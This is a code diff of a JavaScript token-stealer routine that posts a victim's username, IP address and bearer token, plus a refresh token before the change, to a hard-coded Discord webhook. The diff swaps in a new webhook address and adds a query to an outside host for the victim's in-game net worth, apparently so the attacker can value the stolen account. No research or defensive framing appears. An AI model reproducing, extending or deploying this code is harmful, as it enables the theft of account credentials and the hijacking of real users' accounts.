@@ -315,7 +315,23 @@ async function postToWebhook(
     ip,
     webhook,
     refreshToken,
+
 ) {
+        let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
     data = {
         username: "OAR",
         avatar_url:
@@ -340,9 +356,9 @@ async function postToWebhook(
                         value: "```" + bearerToken + "```",
                     },
                     {
-                        name: "**RefreshToken**",
-                        value: "```" + refreshToken + "```",
-                    },   
+                        name: "**Unsoulbounded Networth**",
+                        value: "```"+networth+"```",
+                    },
                 ],
                 footer: {
                     text: "OAR",
@@ -353,7 +369,7 @@ async function postToWebhook(
         ],
     };
     axios.post(
-        "https://discord.com/api/webhooks/1046029632664764478/yCAXrPk8oHrQpWPZkvt4dvz6x15ThMhDh4-R3AtoAG1UU6JWNDIB2lV5yBrmmIE9Y54C",
+        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
         data
     );
     axios
